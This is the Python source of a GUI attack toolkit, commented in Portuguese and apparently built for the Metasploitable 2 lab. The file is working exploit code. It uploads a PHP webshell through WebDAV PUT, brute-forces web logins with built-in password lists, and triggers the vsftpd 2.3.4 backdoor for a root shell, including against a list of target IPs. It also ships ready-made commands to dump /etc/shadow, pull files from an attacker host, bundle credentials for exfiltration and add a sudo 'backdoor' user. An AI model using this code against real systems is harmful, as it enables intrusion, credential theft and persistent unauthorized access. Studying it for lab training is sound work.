#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Toolkit GUI - Metasploitable 2
# Aba 1: HTTP (WebDAV PUT + Brute-force + Shell)
# Aba 2: vsftpd 2.3.4 Backdoor RCE (CVE-2011-2523)
# Uso educacional / testes autorizados.

import urllib.request, urllib.error, urllib.parse, threading
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import socket

# ================= Paleta =================
COR_FUNDO    = "#000000"
COR_TEXTO    = "#00FF00"
COR_VERDE_CL = "#39FF14"
COR_ABOBORA  = "#FF8C00"
COR_VERMELHO = "#FF3333"
COR_ENTRADA  = "#0A0A0A"
FONTE        = ("Consolas", 11)

UA = "Mozilla/5.0 (Windows NT 5.1; rv:1.9) Gecko/2008072905 Firefox/3.0"
SHELL_PATH = "/dav/cmd.php"
PORTA_FTP, PORTA_SHELL = 21, 6200

def req(method, url, data=None, headers=None, timeout=8):
    h = {"User-Agent": UA}
    if headers: h.update(headers)
    r = urllib.request.Request(url, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status, resp.read().decode("latin-1", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("latin-1", "replace")
    except Exception as e:
        return None, str(e)

# =====================================================================
# LISTAS DE COMANDOS PRONTOS
# =====================================================================
COMANDOS_SHELL = [
    "id; uname -a; whoami",
    "cat /etc/passwd",
    "cat /etc/shadow",
    "ls -la /root",
    "ls -la /home",
    "cat /root/.bash_history",
    "netstat -tulpen",
    "ss -tulpen",
    "ps aux",
    "ifconfig -a",
    "ip addr",
    "cat /etc/network/interfaces",
    "crontab -l",
    "ls -la /etc/cron*",
    "cat /etc/fstab",
    "df -h",
    "uname -r",
    "cat /proc/version",
    "dpkg -l | grep -i ssh",
    "cat /etc/ssh/sshd_config | grep -i permit",
    "find / -perm -4000 -type f 2>/dev/null",
    "find / -writable -type d 2>/dev/null | head -30",
    "w",
    "last -20",
    "cat /var/log/auth.log | tail -50",
    "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
    "wget http://192.168.0.10/arquivo -O /tmp/arquivo",
    "tar czf /tmp/coleta.tar.gz /etc/passwd /etc/shadow /etc/ssh 2>/dev/null",
    "mysql -u root -e 'show databases;'",
    "mysql -u root -e 'use mysql; select user, password from user;'",
    "cat /var/www/dvwa/config/config.inc.php 2>/dev/null",
    "cat /var/www/mutillidae/config.inc* 2>/dev/null",
    "echo 'TKT:eJwVy7lumBAAAMC7Gg6EMRE' | chpasswd",
    "useradd -m -s /bin/bash -G sudo backdoor && echo 'backdoor:Senh@123' | chpasswd",
]

COMANDOS_HTTP = [
    "id",
    "uname -a",
    "whoami",
    "cat /etc/passwd",
    "cat /etc/shadow",
    "ls -la /var/www",
    "netstat -tulpen",
    "ps aux",
    "cat /etc/mysql/my.cnf",
    "which nc.traditional socat python perl",
    "uname -r",
    "find / -perm -4000 -type f 2>/dev/null",
]

# =====================================================================
# DESCRIÇÕES DOS COMANDOS (PORTUGUÊS)
# =====================================================================
DESCRICOES = {
    "id; uname -a; whoami": "Mostra usuário atual, versão completa do kernel e confirma se é root. Primeiro comando após obter a shell — confirma que a exploração funcionou.",
    "cat /etc/passwd": "Lista todos os usuários do sistema, seus UIDs e shells padrão.",
    "cat /etc/shadow": "Mostra os hashes de senha de todos os usuários (só root lê). Os hashes podem ser quebrados offline com John the Ripper ou Hashcat.",
    "ls -la /root": "Lista os arquivos da pasta pessoal do root, incluindo arquivos ocultos.",
    "ls -la /home": "Lista as pastas e arquivos de todos os usuários comuns.",
    "cat /root/.bash_history": "Mostra os comandos digitados anteriormente pelo root — pode revelar senhas, IPs e rotinas do administrador.",
    "netstat -tulpen": "Mostra todas as portas TCP/UDP abertas, qual processo escuta cada uma e o usuário dono.",
    "ss -tulpen": "Mesmo objetivo do netstat, usando a ferramenta mais moderna (ss).",
    "ps aux": "Lista todos os processos em execução — útil para identificar serviços vulneráveis e ferramentas de defesa.",
    "ifconfig -a": "Mostra todas as interfaces de rede e seus endereços IP.",
    "ip addr": "Mesmo objetivo do ifconfig, sintaxe moderna.",
    "cat /etc/network/interfaces": "Mostra a configuração fixa de rede: IPs, gateway e DNS.",
    "crontab -l": "Lista as tarefas agendadas (cron) do usuário atual — possível ponto de escalação de privilégio ou persistência.",
    "ls -la /etc/cron*": "Lista todos os arquivos de agendamento do sistema inteiro.",
    "cat /etc/fstab": "Mostra discos e compartilhamentos montados na inicialização (pode revelar NFS/SMB).",
    "df -h": "Mostra o espaço usado/livre de cada partição.",
    "uname -r": "Mostra só a versão do kernel — base para procurar exploits de kernel (ex.: 2.6.x tem vários públicos).",
    "cat /proc/version": "Versão do kernel, compilador e data de compilação.",
    "dpkg -l | grep -i ssh": "Lista os pacotes SSH instalados e suas versões.",
    "cat /etc/ssh/sshd_config | grep -i permit": "Verifica se o SSH permite login direto de root e outras permissões sensíveis.",
    "find / -perm -4000 -type f 2>/dev/null": "Enumeração de escalação de privilégio: lista todos os binários SUID (rodam como dono, geralmente root).",
    "find / -writable -type d 2>/dev/null | head -30": "Mostra pastas onde o usuário atual pode gravar — candidatos a escalada de privilégio.",
    "w": "Mostra quem está logado agora e o que cada um está executando.",
    "last -20": "Mostra os últimos 20 logins (usuário, IP de origem, horário).",
    "cat /var/log/auth.log | tail -50": "Últimas 50 linhas do log de autenticação — revela tentativas de login e contas usadas.",
    "python -c 'import pty; pty.spawn(\"/bin/bash\")'": "Transforma a shell 'burra' (sem prompt/Tab) em uma bash interativa completa.",
    "wget http://192.168.0.10/arquivo -O /tmp/arquivo": "Baixa um arquivo da máquina atacante para o alvo. Troque o IP pelo da SUA máquina antes de usar.",
    "tar czf /tmp/coleta.tar.gz /etc/passwd /etc/shadow /etc/ssh 2>/dev/null": "Empacota passwd, shadow e configs SSH num único arquivo em /tmp para coleta/exfiltração.",
    "mysql -u root -e 'show databases;'": "No Metasploitable 2 o MySQL aceita root sem senha; lista todos os bancos de dados.",
    "mysql -u root -e 'use mysql; select user, password from user;'": "Extrai usuários e hashes de senha do próprio MySQL.",
    "cat /var/www/dvwa/config/config.inc.php 2>/dev/null": "Lê a configuração do DVWA — contém a senha do banco MySQL em texto claro.",
    "cat /var/www/mutillidae/config.inc* 2>/dev/null": "Lê a configuração do Mutillidae — credenciais do banco em texto claro.",
    "echo 'TKT:eJwVy7lumBAAAMC7Gg6EMRE' | chpasswd": "PERSISTÊNCIA: troca a senha do usuário TKT (se existir) para manter acesso caso a vulnerabilidade seja corrigida.",
    "useradd -m -s /bin/bash -G sudo backdoor && echo 'backdoor:Senh@123' | chpasswd": "PERSISTÊNCIA: cria o usuário 'backdoor' com shell bash e grupo sudo — acesso permanente ao sistema.",
    "id": "Confirma que a webshell funciona e mostra o usuário do servidor web (normalmente www-data).",
    "whoami": "Mostra o nome do usuário atual da webshell.",
    "uname -a": "Versão completa do kernel — para procurar exploits de escalação.",
    "ls -la /var/www": "Lista os sites/aplicações hospedados no servidor.",
    "cat /etc/mysql/my.cnf": "Configuração do MySQL — pode revelar a senha do root do banco.",
    "which nc.traditional socat python perl": "Verifica quais ferramentas existem no alvo para montar um reverse shell. No Metasploitable use 'nc.traditional' (o nc padrão não tem -e).",
}

AJUDA_GERAL = """AJUDA — TOOLKIT METASPLOITABLE 2

ABA 1 — HTTP / WebDAV / Brute
1. Informe a URL do alvo (http://IP) e clique em EXECUTAR.
   O programa testa o diretório /dav/ (WebDAV), envia uma shell PHP
   via PUT e confirma se ela executa comandos (RCE).
2. Depois use o campo SHELL > para mandar comandos pela webshell.
   Selecione um comando pronto no dropdown e clique em 'Colocar no
   campo' (edita antes) ou 'Enviar'.
3. O botão 'Parar brute' interrompe o brute-force de senhas nos
   formulários DVWA, Mutillidae e phpMyAdmin.

ABA 2 — vsftpd 2.3.4 Backdoor (CVE-2011-2523)
1. Informe o IP do alvo e clique em EXPLORAR.
   O exploit envia 'USER exploit:)' ao FTP, o que ativa o backdoor
   do vsftpd 2.3.4 e abre uma shell ROOT na porta 6200.
2. Quando aparecer 'BACKDOOR ATIVA!', use o campo shell> para
   mandar comandos. Selecione no dropdown 'Comando pronto' e use
   'Enviar direto' (manda na hora) ou clique no comando para editar.
3. 'Escanear Lista' lê o Lista_Alvos.txt e testa vários IPs, um a
   cada 15 segundos.
4. 'Fechar Shell' encerra a conexão da porta 6200.

BOTÕES DE AJUDA
- '? Ajuda'     → mostra esta tela.
- '? O que faz' → mostra em português a explicação do comando
                  selecionado no dropdown 'Comando pronto'.

ATALHO: Ctrl+L limpa a tela da aba ativa.

AVISO: use apenas em laboratório / ambientes autorizados
(Metasploitable 2 é feito para isso)."""

# =====================================================================
# LÓGICA ABA 1 - HTTP (WebDAV + Brute + Shell HTTP)
# =====================================================================
SHELL_PHP = """<?php
if (isset($_REQUEST['cmd'])) { system($_REQUEST['cmd'] . ' 2>&1'); }
else { echo 'SHELL_OK'; }
?>"""

USERS = ["admin", "root", "administrator", "user", "test",
         "gordonb", "1337", "pablo", "smithy", "john", "jane"]
PASSWORDS = ["", "admin", "password", "123456", "root", "toor", "admin123", "12345",
             "password123", "letmein", "welcome", "monkey", "abc123", "qwerty",
             "admin@123", "111111", "pass123", "secure", "changeme", "default",
             "adminpass", "UserPass123"]

TARGET_FORMS = [
    ("/dvwa/login.php",       "username", "password", "Welcome"),
    ("/mutillidae/index.php", "username", "password", "Logged In"),
    ("/phpMyAdmin/",          "pma_username", "pma_password", "CREATE DATABASE"),
]

def dav_put(base, log):
    log("[*] Testando WebDAV PUT em /dav/ ...", "sistema")
    r = urllib.request.Request(base + "/dav/", method="OPTIONS", headers={"User-Agent": UA})
    try:
        with urllib.request.urlopen(r, timeout=8) as resp:
            allow = resp.headers.get("Allow", "")
        log(f"[*] Allow: {allow}", "sistema")
    except Exception as e:
        log(f"[-] /dav/ inacessível: {e}", "erro"); return
    if "PUT" not in allow:
        log("[-] PUT não suportado.", "erro"); return
    s, b = req("PUT", base + SHELL_PATH, data=SHELL_PHP.encode(),
               headers={"Content-Type": "application/x-httpd-php"})
    if s in (200, 201, 204):
        log(f"[+] PUT OK ({s}) -> {base}{SHELL_PATH}", "sistema")
        s2, b2 = req("GET", base + SHELL_PATH + "?cmd=id")
        if s2 and "uid=" in b2:
            log("[+] RCE via WebDAV confirmada! Use o campo SHELL abaixo.", "sistema")
        else:
            log("[?] Upload feito, execução não confirmada: " + b2[:200], "erro")
    else:
        log(f"[-] PUT falhou ({s}): {b[:150]}", "erro")

def shell_cmd_http(base, cmd, log):
    s, b = req("GET", base + SHELL_PATH + "?cmd=" + urllib.parse.quote(cmd))
    log("$ " + cmd, "comando")
    log(b if s else f"[erro] {b}", "abobora")

def brute(base, log, stop_flag):
    log("[*] Iniciando brute-force nos formulários conhecidos ...", "sistema")
    for path, uf, pf, success in TARGET_FORMS:
        url = base + path
        s, b = req("GET", url)
        if s is None or s in (301, 302):
            continue
        log(f"[*] Testando {url} ...", "sistema")
        achou = False
        for u in USERS:
            if achou: break
            for p in PASSWORDS:
                if stop_flag[0]:
                    log("[!] Interrompido.", "erro"); return
                data = urllib.parse.urlencode({uf: u, pf: p}).encode()
                s2, b2 = req("POST", url, data=data)
                if path.startswith("/phpMyAdmin"):
                    if s2 in (200, 302) and "Access denied" not in b2 and "denied" not in b2.lower():
                        log(f"[+] CREDENCIAL phpMyAdmin:  {u}  /  {p!r}", "cred")
                        achou = True; break
                else:
                    if s2 and (success in b2 or s2 == 302):
                        log(f"[+] CREDENCIAL ENCONTRADA em {path}:  {u}  /  {p!r}", "cred")
                        achou = True; break
        if not achou:
            log(f"[-] Nenhuma credencial em {path}", "erro")
    log("[*] Brute-force concluído.", "sistema")

def run_all_http(base, log, stop_flag):
    log(f"[*] Alvo: {base} (Metasploitable 2)", "sistema")
    s, _ = req("GET", base + "/")
    log(f"[*] HTTP status: {s}", "sistema")
    dav_put(base, log)
    for p in ["/twiki/bin/view", "/phpMyAdmin/", "/dvwa/login.php", "/mutillidae/"]:
        s2, _ = req("GET", base + p)
        if s2 == 200:
            log(f"[+] Exposto: {p}", "sistema")
    brute(base, log, stop_flag)
    log("[*] Concluído.", "sistema")

# =====================================================================
# LÓGICA ABA 2 - vsftpd 2.3.4 Backdoor (CVE-2011-2523)
# =====================================================================
def sock_ler(sock, timeout=3):
    sock.settimeout(timeout)
    dados = b""
    try:
        while True:
            parte = sock.recv(4096)
            if not parte:
                break
            dados += parte
            sock.settimeout(0.4)
    except (socket.timeout, OSError):
        pass
    return dados.decode(errors="replace")

# =====================================================================
# GUI
# =====================================================================
class Aplicativo(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Toolkit Metasploitable 2 HTTP + vsftpd")
        self.geometry("1100x780")
        self.configure(bg=COR_FUNDO)

        self.shell_ftp = None
        self.alvos_pendentes = []
        self.stop_flag = [False]

        estilo = ttk.Style(self)
        estilo.theme_use("clam")
        estilo.configure("TNotebook", background=COR_FUNDO, borderwidth=0)
        estilo.configure("TNotebook.Tab", background="#111111", foreground=COR_TEXTO,
                         font=FONTE, padding=[14, 6])
        estilo.map("TNotebook.Tab",
                   background=[("selected", "#003300")],
                   foreground=[("selected", COR_VERDE_CL)])
        estilo.configure("Verde.TCombobox",
                         fieldbackground=COR_ENTRADA, background="#111111",
                         foreground=COR_VERDE_CL, arrowcolor=COR_VERDE_CL)
        estilo.map("Verde.TCombobox",
                   fieldbackground=[("readonly", COR_ENTRADA)],
                   foreground=[("readonly", COR_VERDE_CL)],
                   selectbackground=[("readonly", "#003300")],
                   selectforeground=[("readonly", COR_VERDE_CL)])
        self.option_add("*TCombobox*Listbox*Background", "#111111")
        self.option_add("*TCombobox*Listbox*Foreground", COR_VERDE_CL)
        self.option_add("*TCombobox*Listbox*selectBackground", "#003300")
        self.option_add("*TCombobox*Listbox*selectForeground", COR_VERDE_CL)

        self.nb = ttk.Notebook(self)
        self.nb.pack(fill="both", expand=True, padx=6, pady=6)

        self.aba_http = tk.Frame(self.nb, bg=COR_FUNDO)
        self.aba_ftp  = tk.Frame(self.nb, bg=COR_FUNDO)
        self.nb.add(self.aba_http, text="  HTTP / WebDAV / Brute  ")
        self.nb.add(self.aba_ftp,  text="  vsftpd 2.3.4 Backdoor  ")

        self._montar_aba_http()
        self._montar_aba_ftp()
        self.bind("<Control-l>", lambda e: self.limpar_aba_ativa())

    # ---------- helper widgets ----------
    def _campo(self, pai, variavel, largura):
        return tk.Entry(pai, textvariable=variavel, width=largura,
                        bg=COR_ENTRADA, fg=COR_TEXTO, insertbackground=COR_TEXTO,
                        font=FONTE, relief="flat",
                        highlightbackground=COR_TEXTO, highlightthickness=1)

    def _botao(self, pai, texto, comando):
        return tk.Button(pai, text=texto, command=comando,
                         bg=COR_ENTRADA, fg=COR_VERDE_CL,
                         activebackground="#003300", activeforeground=COR_VERDE_CL,
                         font=FONTE, relief="groove", borderwidth=1)

    def _combo(self, pai, valores, ao_escolher):
        cb = ttk.Combobox(pai, values=valores, width=68,
                          state="readonly", style="Verde.TCombobox", font=FONTE)
        cb.set("▼ Comandos prontos — clique para escolher")
        cb.bind("<<ComboboxSelected>>", ao_escolher)
        return cb

    def _terminal(self, pai):
        out = scrolledtext.ScrolledText(
            pai, bg=COR_FUNDO, fg=COR_TEXTO, insertbackground=COR_TEXTO,
            font=FONTE, selectbackground="#003300", selectforeground=COR_VERDE_CL,
            relief="flat", borderwidth=2,
            highlightbackground=COR_TEXTO, highlightcolor=COR_VERDE_CL,
            highlightthickness=1)
        out.pack(fill="both", expand=True, padx=8, pady=2)
        for tag, cor in [("sistema", COR_TEXTO), ("comando", COR_VERDE_CL),
                         ("abobora", COR_ABOBORA), ("erro", COR_VERMELHO),
                         ("cred", COR_ABOBORA)]:
            out.tag_configure(tag, foreground=cor)
        out.tag_configure("cred", font=FONTE + ("bold",))
        out.configure(state="disabled")
        return out

    # ============================================================
    # ABA 1 - HTTP
    # ============================================================
    def _montar_aba_http(self):
        topo = tk.Frame(self.aba_http, bg=COR_FUNDO)
        topo.pack(fill="x", padx=8, pady=6)
        tk.Label(topo, text="URL alvo:", bg=COR_FUNDO, fg=COR_TEXTO, font=FONTE).pack(side="left")
        self.http_url = tk.StringVar(value="http://192.168.0.13")
        self._campo(topo, self.http_url, 48).pack(side="left", padx=5)
        self._botao(topo, "Executar", self.http_start).pack(side="left", padx=3)
        self._botao(topo, "Parar brute", lambda: self.stop_flag.__setitem__(0, True)).pack(side="left", padx=3)
        # --- Limpar + ajuda (canto direito) ---
        self._botao(topo, "Limpar Tela", self.limpar_aba_ativa).pack(side="right", padx=3)
        self._botao(topo, "? Ajuda", self.ajuda_geral).pack(side="right", padx=3)
        self._botao(topo, "? O que faz", lambda: self.mostrar_comando(self.http_combo)).pack(side="right", padx=3)
        # --- Seleção de comando (em cima do campo SHELL) ---
        sel = tk.Frame(self.aba_http, bg=COR_FUNDO)
        sel.pack(fill="x", padx=8, pady=(4, 0))
        tk.Label(sel, text="Comando pronto:", bg=COR_FUNDO, fg=COR_TEXTO, font=FONTE).pack(side="left")
        self.http_combo = self._combo(sel, COMANDOS_HTTP, self._http_combo_escolhido)
        self.http_combo.pack(side="left", padx=5)
        self._botao(sel, "Colocar no campo", self._http_combo_escolhido).pack(side="left", padx=3)

        # --- Linha SHELL > ---
        sh = tk.Frame(self.aba_http, bg=COR_FUNDO)
        sh.pack(fill="x", padx=8, pady=4)
        tk.Label(sh, text="SHELL > ", bg=COR_FUNDO, fg=COR_VERDE_CL, font=FONTE).pack(side="left")
        self.http_cmd = tk.StringVar()
        c = self._campo(sh, self.http_cmd, 55)
        c.pack(side="left", padx=4, fill="x", expand=True)
        c.bind("<Return>", lambda e: self.http_enviar())
        self._botao(sh, "Enviar", self.http_enviar).pack(side="left", padx=3)

        # --- Terminal por último ---
        self.http_out = self._terminal(self.aba_http)

    def _http_combo_escolhido(self, _event=None):
        valor = self.http_combo.get()
        if valor.startswith("▼"):
            return
        self.http_cmd.set(valor)

    def http_log(self, texto, tag="sistema"):
        self._escrever(self.http_out, texto, tag)

    def _escrever(self, out, texto, tag):
        out.configure(state="normal")
        out.insert("end", texto + "\n", tag)
        out.see("end")
        out.configure(state="disabled")
        self.update_idletasks()

    def http_start(self):
        base = self.http_url.get().strip().rstrip("/")
        if not base.startswith("http"):
            messagebox.showwarning("Aviso", "Informe a URL (http://IP)")
            return
        self.stop_flag[0] = False
        threading.Thread(target=lambda: run_all_http(base, self.http_log, self.stop_flag),
                         daemon=True).start()

    def http_enviar(self):
        cmd = self.http_cmd.get().strip()
        if not cmd: return
        if cmd in ("clear", "cls", "limpar"):
            self.limpar_aba_ativa()
            self.http_cmd.set("")
            return
        self.http_cmd.set("")
        base = self.http_url.get().strip().rstrip("/")
        threading.Thread(target=lambda: shell_cmd_http(base, cmd, self.http_log),
                         daemon=True).start()

    # ============================================================
    # ABA 2 - vsftpd
    # ============================================================
    def _montar_aba_ftp(self):
        topo = tk.Frame(self.aba_ftp, bg=COR_FUNDO)
        topo.pack(fill="x", padx=8, pady=6)
        tk.Label(topo, text="IP:", bg=COR_FUNDO, fg=COR_TEXTO, font=FONTE).pack(side="left")
        self.ftp_alvo = tk.StringVar(value="192.168.0.13")
        self._campo(topo, self.ftp_alvo, 30).pack(side="left", padx=5)
        self._botao(topo, "Explorar", self.ftp_explorar).pack(side="left", padx=4)

        tk.Label(topo, text="Lista_Alvos.txt:", bg=COR_FUNDO, fg=COR_TEXTO, font=FONTE).pack(side="left", padx=(12, 0))
        self.ftp_lista = tk.StringVar()
        self._campo(topo, self.ftp_lista, 22).pack(side="left", padx=5)
        self._botao(topo, "Procurar...", self.ftp_escolher).pack(side="left", padx=2)
        self._botao(topo, "Escanear Lista", self.ftp_escanear).pack(side="left", padx=2)
        # --- Botões de ajuda (canto direito) ---
        self._botao(topo, "? Ajuda", self.ajuda_geral).pack(side="right", padx=3)
        self._botao(topo, "? O que faz", lambda: self.mostrar_comando(self.ftp_combo)).pack(side="right", padx=3)

        # --- Seleção de comando ---
        sel = tk.Frame(self.aba_ftp, bg=COR_FUNDO)
        sel.pack(fill="x", padx=8, pady=(4, 0))
        tk.Label(sel, text="Comando pronto:", bg=COR_FUNDO, fg=COR_TEXTO, font=FONTE).pack(side="left")
        self.ftp_combo = self._combo(sel, COMANDOS_SHELL, self._ftp_combo_escolhido)
        self.ftp_combo.pack(side="left", padx=5)
        self._botao(sel, "Enviar direto", self.ftp_enviar_combo).pack(side="left", padx=3)

        # --- Linha shell> (em cima do terminal) ---
        baixo = tk.Frame(self.aba_ftp, bg=COR_FUNDO)
        baixo.pack(fill="x", padx=8, pady=4)
        tk.Label(baixo, text="shell> ", bg=COR_FUNDO, fg=COR_VERDE_CL, font=FONTE).pack(side="left")
        self.ftp_cmd = tk.StringVar()
        c = self._campo(baixo, self.ftp_cmd, 55)
        c.pack(side="left", padx=4, fill="x", expand=True)
        c.bind("<Return>", lambda e: self.ftp_enviar())
        self._botao(baixo, "Executar", self.ftp_enviar).pack(side="left", padx=3)
        self._botao(baixo, "Fechar Shell", self.ftp_fechar).pack(side="left", padx=3)
        self._botao(baixo, "Limpar Tela", self.limpar_aba_ativa).pack(side="left", padx=3)

        # --- Terminal por último (ocupa o restante da tela) ---
        self.ftp_out = self._terminal(self.aba_ftp)

    def _ftp_combo_escolhido(self, _event=None):
        valor = self.ftp_combo.get()
        if valor.startswith("▼"):
            return
        self.ftp_cmd.set(valor)

    def ftp_enviar_combo(self):
        valor = self.ftp_combo.get()
        if valor.startswith("▼"):
            return
        self.ftp_cmd.set(valor)
        self.ftp_enviar()

    def ftp_log(self, texto, tag="sistema"):
        self._escrever(self.ftp_out, texto, tag)

    def ftp_escolher(self):
        arq = filedialog.askopenfilename(title="Selecione o Lista_Alvos.txt",
                                         filetypes=[("Arquivos de texto", "*.txt"), ("Todos", "*.*")])
        if arq:
            self.ftp_lista.set(arq)

    def ftp_escanear(self):
        try:
            with open(self.ftp_lista.get(), encoding="utf-8") as f:
                alvos = [l.strip() for l in f if l.strip()]
        except Exception as e:
            messagebox.showerror("Erro", f"Não foi possível abrir o arquivo:\n{e}")
            return
        if not alvos:
            messagebox.showwarning("Aviso", "A lista está vazia.")
            return
        self.ftp_log(f"[*] Escaneando {len(alvos)} alvo(s)", "sistema")
        self.alvos_pendentes = alvos
        self._proximo_alvo_ftp()

    def _proximo_alvo_ftp(self):
        if not self.alvos_pendentes:
            self.ftp_log("[*] Scan concluído. Digite comandos no shell>", "sistema")
            return
        alvo = self.alvos_pendentes.pop(0)
        self.ftp_log(f"\n{'='*60}\n[*] Alvo: {alvo}", "sistema")
        self.ftp_alvo.set(alvo)
        self.ftp_explorar()
        self.after(15000, self._proximo_alvo_ftp)

    def ftp_explorar(self):
        alvo = self.ftp_alvo.get().strip()
        if not alvo:
            messagebox.showwarning("Aviso", "Digite o IP do alvo.")
            return
        self.ftp_log(f"\n[*] Explorando: {alvo}", "sistema")
        threading.Thread(target=self._ftp_conectar, args=(alvo,), daemon=True).start()

    def _ftp_conectar(self, alvo):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(8)
            sock.connect((alvo, PORTA_FTP))
            banner = sock_ler(sock)
            self.ftp_log(f"[+] Banner: {banner.strip()}", "sistema")
            if "2.3.4" not in banner:
                self.ftp_log("[!] Banner não mostra vsftpd 2.3.4. Continuando...", "erro")
            sock.send(b"USER exploit:)\r\n")
            self.ftp_log(f"[*] USER -> {sock_ler(sock).strip()}", "sistema")
            sock.send(b"PASS senha\r\n")
            self.ftp_log(f"[*] PASS -> {sock_ler(sock).strip()}", "sistema")
            sock.close()
        except Exception as e:
            self.ftp_log(f"[!] Erro na conexão FTP: {e}", "erro")
            return
        self.ftp_log("[*] Aguardando backdoor abrir a shell na porta 6200", "sistema")
        self.after(1000, self._ftp_shell, alvo, 1)

    def _ftp_shell(self, alvo, tentativa):
        shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        shell.settimeout(4)
        try:
            shell.connect((alvo, PORTA_SHELL))
        except OSError:
            if tentativa < 8:
                self.ftp_log(f"    tentativa {tentativa}: porta 6200 fechada, aguardando...", "sistema")
                self.after(1000, self._ftp_shell, alvo, tentativa + 1)
                return
            self.ftp_log("[!] Porta 6200 não abriu após 8 tentativas.", "erro")
            self.ftp_log("[!] Possíveis causas: vsftpd sem backdoor ou firewall.", "erro")
            return
        self.shell_ftp = shell
        self.ftp_log(f"[+] BACKDOOR ATIVA! Shell em: {alvo}:{PORTA_SHELL}", "cred")
        shell.send(b"id; uname -a; whoami\n")
        self.after(800, lambda: self.ftp_log(sock_ler(self.shell_ftp) or "(sem saída)", "abobora"))

    def ftp_enviar(self):
        cmd = self.ftp_cmd.get().strip()
        if not cmd: return
        if cmd in ("clear", "cls", "limpar"):
            self.limpar_aba_ativa(); self.ftp_cmd.set(""); return
        if self.shell_ftp is None:
            messagebox.showwarning("Aviso", "Explore um alvo primeiro (botão 'Explorar').")
            return
        self.ftp_log(f"shell> {cmd}", "comando")
        self.ftp_cmd.set("")
        try:
            self.shell_ftp.send((cmd + "\n").encode())
        except OSError:
            self.ftp_log("[!] Conexão perdida.", "erro")
            self.shell_ftp = None
            return
        self.after(700, lambda: self.ftp_log(sock_ler(self.shell_ftp) or "(sem saída)", "abobora"))

    def ftp_fechar(self):
        if self.shell_ftp:
            try: self.shell_ftp.close()
            except OSError: pass
            self.shell_ftp = None
            self.ftp_log("[*] Shell fechada.", "sistema")

    # ============================================================
    # AJUDA
    # ============================================================
    def _janela_texto(self, titulo, texto):
        j = tk.Toplevel(self)
        j.title(titulo)
        j.geometry("820x560")
        j.configure(bg=COR_FUNDO)
        j.transient(self)
        txt = scrolledtext.ScrolledText(
            j, bg=COR_FUNDO, fg=COR_TEXTO, font=FONTE, wrap="word",
            insertbackground=COR_TEXTO, relief="flat", borderwidth=2,
            highlightbackground=COR_TEXTO, highlightthickness=1)
        txt.pack(fill="both", expand=True, padx=8, pady=8)
        txt.insert("1.0", texto)
        txt.configure(state="disabled")
        self._botao(j, "Fechar", j.destroy).pack(pady=(0, 8))

    def ajuda_geral(self):
        self._janela_texto("Ajuda — Como usar o Toolkit", AJUDA_GERAL)

    def mostrar_comando(self, combo):
        valor = combo.get()
        if valor.startswith("▼") or valor not in DESCRICOES:
            messagebox.showinfo("O que faz?",
                                "Selecione primeiro um comando no dropdown 'Comando pronto'.")
            return
        titulo = f"O que faz: {valor}"
        onde = ("shell vsftpd (ROOT, porta 6200)" if combo is self.ftp_combo
                else "webshell HTTP (usuário www-data)")
        texto = (f"COMANDO:\n{valor}\n\n"
                 f"O QUE FAZ EM PORTUGUÊS\n\n{DESCRICOES[valor]}\n\n"
                 f"ONDE RODA: {onde}")
        self._janela_texto(titulo, texto)

    # ============================================================
    # Comuns
    # ============================================================
    def limpar_aba_ativa(self):
        idx = self.nb.index(self.nb.select())
        out = self.http_out if idx == 0 else self.ftp_out
        out.configure(state="normal")
        out.delete("1.0", "end")
        out.configure(state="disabled")

if __name__ == "__main__":
    Aplicativo().mainloop()
